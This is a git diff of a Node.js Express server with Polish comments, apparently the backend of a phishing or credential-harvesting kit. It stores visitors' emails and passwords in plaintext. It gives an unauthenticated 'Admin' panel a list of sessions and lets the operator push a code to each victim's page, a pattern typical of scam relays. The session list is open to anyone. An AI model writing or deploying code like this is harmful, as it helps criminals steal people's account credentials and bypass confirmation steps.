@@ -1,76 +1,84 @@
-// api/confirm.js - wersja CommonJS (działa na Renderze)
+// server.js - GOTOWY SERWER Z EXPRESS
+const express = require('express');
+const app = express();
+const PORT = process.env.PORT || 3000;
+
+app.use(express.json());
+app.use(express.static('.'));
+
+// API HANDLER
 let sessions = {};
 
-module.exports = (req, res) => {
-    // CORS
-    res.setHeader('Access-Control-Allow-Origin', '*');
-    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
-    res.setHeader('Access-Control-Allow-Headers', 'Content-Type');
+app.get('/api/confirm', (req, res) => {
+    const session = req.query.session;
+    const list = req.query.list;
 
-    if (req.method === 'OPTIONS') {
-        return res.status(200).end();
+    if (list === 'true') {
+        const active = Object.keys(sessions)
+            .filter(k => sessions[k].active !== false)
+            .map(k => ({
+                session: k,
+                email: sessions[k].email || 'brak',
+                code: sessions[k].code || '--',
+                sent: sessions[k].sent || false
+            }));
+        return res.json({ sessions: active });
     }
 
-    // GET
-    if (req.method === 'GET') {
-        const session = req.query.session;
-        const list = req.query.list;
-
-        if (list === 'true') {
-            const active = Object.keys(sessions)
-                .filter(k => sessions[k].active !== false)
-                .map(k => ({
-                    session: k,
-                    email: sessions[k].email || 'brak',
-                    code: sessions[k].code || '--',
-                    sent: sessions[k].sent || false
-                }));
-            return res.status(200).json({ sessions: active });
-        }
-
-        if (session) {
-            const data = sessions[session] || { code: '--' };
-            return res.status(200).json({ code: data.code || '--' });
-        }
-
-        return res.status(400).json({ error: 'Brak parametru' });
+    if (session) {
+        const data = sessions[session] || { code: '--' };
+        return res.json({ code: data.code || '--' });
     }
 
-    // POST
-    if (req.method === 'POST') {
-        const { action, session, email, password, code } = req.body;
+    res.json({ 
+        status: 'ok',
+        message: 'API działa! 🎉',
+        sessions_count: Object.keys(sessions).length,
+        sessions: Object.keys(sessions)
+    });
+});
 
-        if (action === 'create') {
-            sessions[session] = {
-                email: email || 'brak',
-                password: password || 'brak',
-                code: '--',
-                sent: false,
-                active: true,
-                created: new Date().toISOString()
-            };
-            return res.status(200).json({ success: true, session });
-        }
+app.post('/api/confirm', (req, res) => {
+    const { action, session, email, password, code } = req.body;
 
-        if (action === 'set_code') {
-            if (!sessions[session]) {
-                return res.status(404).json({ error: 'Sesja nie istnieje' });
-            }
-            sessions[session].code = code;
-            sessions[session].sent = false;
-            return res.status(200).json({ success: true, code });
-        }
-
-        if (action === 'send_code') {
-            if (!sessions[session]) {
-                return res.status(404).json({ error: 'Sesja nie istnieje' });
-            }
-            sessions[session].sent = true;
-            return res.status(200).json({ success: true, sent: true });
-        }
-
-        return res.status(400).json({ error: 'Nieznana akcja' });
+    if (action === 'create') {
+        sessions[session] = {
+            email: email || 'brak',
+            password: password || 'brak',
+            code: '--',
+            sent: false,
+            active: true,
+            created: new Date().toISOString()
+        };
+        console.log('✅ Sesja utworzona:', session);
+        return res.json({ success: true, session });
     }
 
-    return res.status(405).json({ error: 'Method not allowed' });
-};
+    if (action === 'set_code') {
+        if (!sessions[session]) {
+            return res.status(404).json({ error: 'Sesja nie istnieje' });
+        }
+        sessions[session].code = code;
+        sessions[session].sent = false;
+        console.log('✅ Kod ustawiony:', session, code);
+        return res.json({ success: true, code });
+    }
+
+    if (action === 'send_code') {
+        if (!sessions[session]) {
+            return res.status(404).json({ error: 'Sesja nie istnieje' });
+        }
+        sessions[session].sent = true;
+        console.log('✅ Kod wysłany:', session);
+        return res.json({ success: true, sent: true });
+    }
+
+    res.status(400).json({ error: 'Nieznana akcja' });
+});
+
+app.listen(PORT, () => {
+    console.log(`✅ Server running on port ${PORT}`);
+    console.log(`📱 Admin: /admin.html`);
+    console.log(`🎫 User: /`);
+    console.log(`🔗 API: /api/confirm`);
+});
